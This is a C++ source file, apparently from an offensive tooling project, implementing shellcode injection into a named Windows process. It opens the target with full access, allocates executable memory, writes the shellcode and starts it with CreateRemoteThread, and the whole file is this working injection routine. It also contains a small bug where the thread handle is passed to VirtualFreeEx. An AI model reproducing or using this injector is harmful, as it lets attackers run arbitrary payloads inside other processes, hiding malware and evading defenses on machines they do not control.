#include "ShellcodeProcessInjector.h"

#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>

namespace ShellcodeExecution
{
	void ShellcodeProcessInjector::Execute()
	{
		ProcessInjection();
	}

	int ShellcodeProcessInjector::ProcessInjection()
	{
		PROCESSENTRY32 pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32);

		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		Process32First(snapshot, &pe32);

		std::wcout << "[*] Obtaining handle to process " << TARGET_PROCESS_PROGRAM_NAME << std::endl;
		do
		{
			if (wcscmp(pe32.szExeFile, TARGET_PROCESS_PROGRAM_NAME) != 0)
				continue;

			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);

			LPVOID allocatedMemory = VirtualAllocEx(hProcess, NULL, this->_shellcodeSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

			if (allocatedMemory == NULL)
			{
				std::cout << "[!!] Failed to allocate memory: " << GetLastError() << std::endl;
				return -1;
			}

			std::cout << "[+] Memory allocated at address: " << allocatedMemory << std::endl;

			WriteProcessMemory(hProcess, allocatedMemory, this->_shellcode, this->_shellcodeSize, NULL);

			HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, NULL, 0, NULL);

			if (hThread == NULL) {
				std::cout << "[!!] Failed to obtain handle to process: " << GetLastError() << std::endl;
				return -1;
			}

			std::wcout << "[+] Handle to process " << TARGET_PROCESS_PROGRAM_NAME << " obtained" << std::endl;

			WaitForSingleObject(hThread, INFINITE);

			std::cout << "[*] Freeing memory..." << std::endl;

			VirtualFreeEx(hThread, allocatedMemory, 0, MEM_RELEASE);

			std::cout << "[*] Closing handle..." << std::endl;

			CloseHandle(hThread);

			CloseHandle(hProcess);

			std::cout << "[*] Exiting" << std::endl;

			return 0;

		} while (Process32Next(snapshot, &pe32));

		std::wcout << "[!!] Failed to obtain handle to " << TARGET_PROCESS_PROGRAM_NAME;
		std::wcout << ", is it running?" << std::endl;
		return 1;
	}
}